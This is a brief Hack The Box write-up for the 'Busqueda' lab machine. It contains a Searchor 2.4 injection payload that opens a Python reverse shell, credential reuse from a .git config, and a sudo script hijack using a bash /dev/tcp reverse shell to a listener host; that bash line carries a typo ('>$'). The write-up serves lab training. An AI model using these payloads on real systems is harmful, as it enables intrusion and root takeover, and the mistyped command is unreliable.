# Busqueda

### Reconnaissance

- port 22 SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- port 80 HTTP Apache httpd 2.4.52

### Exploitation

Searchor v 2.4 has an [RCE vulnerability](https://github.com/jonnyzar/POC-Searchor-2.4.2) in the query parameter 

Start a netcat listener and get a reverse shell with this

`', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#`

Ran linpeas but got thrown by the output, ended up getting help here [from this walkthrough](https://medium.com/@cybrpunk_panda/busqueda-writeup-hack-the-box-2c131b638491)

In the /var/html/app directory there's a .git folder with a config file containing credentials.

The user is cody but the password works for svc giving me ssh access and the ability to run sudo -l

### Privilege Escalation

sudo -l shows the svc user can run a python script in /opt/scripts as root, `/opt/scripts/system-checker.py`. 
By navigating to a writable directory and creating a reverse shell script with the same name as one of the 
options for the python script you can get root access

```
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py

Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

	docker-ps		: List running docker containers
	docker-inspect	: Inpect a certain docker container
	full-checkup	: Run a full system checkup
```

bash reverse shell, full-checkup.sh

`bash -i >$ /dev/tcp/10.10.10.10/4444 0>&1`

Run script with sudo privileges in same folder as bash reverse shell to gain a root shell

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

